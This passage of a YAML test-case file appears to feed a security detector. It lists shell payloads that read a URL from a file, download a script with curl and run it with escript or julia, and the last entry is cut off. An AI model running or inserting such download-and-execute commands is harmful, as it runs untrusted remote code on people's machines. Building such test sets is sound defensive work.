- vars:
    payload: |2
        _u=$(cat "$srcdir/url.txt")
        curl -fsSL -o stage.erl "$_u"
        escript stage.erl
  id: 011-exotic-var-escript
- vars:
    payload: |2
        curl -fsSL --url "$(cat "$srcdir/url.txt")" -o stage.jl
        julia stage.jl
  id: 014-curl-url-flag-julia
- vars:
    payload: |2
        curl -fsSL -o stage.exs "$(cat "$srcdir/url.txt")"
